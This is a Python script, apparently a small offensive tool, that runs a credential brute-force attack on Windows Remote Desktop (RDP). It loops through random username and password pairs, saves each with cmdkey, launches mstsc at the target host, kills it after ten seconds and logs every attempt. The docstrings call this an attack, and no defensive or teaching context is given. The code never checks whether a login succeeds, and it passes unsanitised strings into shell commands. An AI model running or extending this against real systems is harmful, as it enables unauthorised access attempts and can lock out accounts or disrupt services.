from os import system
from random import choice
from threading import Thread
from string import ascii_letters, digits
from src.process import terminate_process
from datetime import datetime, timedelta
from time import sleep


def generate_random_string(length: int=8):
    """ Generate a random string. Useful for password and username generation.
    Args:
        length (int, optional): Length of the generated string. Defaults to 8.

    Returns:
        (str): Random generated string
    """
    return "".join(choice(seq=(ascii_letters + digits)) for i in range(length))


def add_cmdkey(host: str, user: str, password: str):
    """ Add user credentials for a specified host as a key to the terminal.
    Args:
        host (str): Host to bind the credentials
        user (str): Username to bind
        password (str): Password to bind

    Returns:
        (NoneType): No return value.
    """
    system(f"cmdkey /generic:{host} /user:{user} /pass:{password}")
    return None


def remove_cmdkey(host: str):
    """ Delete an existing cmdkey with it's specified hostname
    Args:
        host (str): Hostname the key is identified with

    Returns:
        (NoneType): No return value.
    """
    system(f"cmdkey /delete:{host}")
    return None


def test_credentials(host: str, target_system:str):
    """ Test saved credentials on a given system
    
    Args:
        host (str): Hostname of target
        target_system (str): System to attack. E.g. RDP

    Returns:
        (NoneType): No return value.
    """
    if target_system == "RDP":
        system(f"START /B mstsc /v:{host} &")
        sleep(10)
        terminate_process("mstsc.exe")
    return None
        
        
def bruteforce(host: str, system: str, max_runs: int, timeout: int=None):
    """ Brute force attack on a given system on a given host.
    
    Args:
        host (str): Hostname of target
        system (str): System to attack. E.g. RDP
        max_runs (int): Maximum iterations till program end
        timeout (int, optional): In addition to max runs a time based anchor. Defaults to None.

    Returns:
        (list): List of tested usernames and passwords
    """
    if timeout is None:
        timeout = 999999999
    starttime: datetime = datetime.now()
    i: int = 0
    results: list = []
    while i < max_runs and datetime.now() < starttime + timedelta(seconds=timeout):
        username: str = generate_random_string()
        password: str = generate_random_string()
        add_cmdkey(host, username, password)
        test_credentials(host, system)
        remove_cmdkey(host)
        results.append((datetime.now().strftime("%m/%d/%Y, %H:%M:%S"), username, password))
        i +=1
    return results
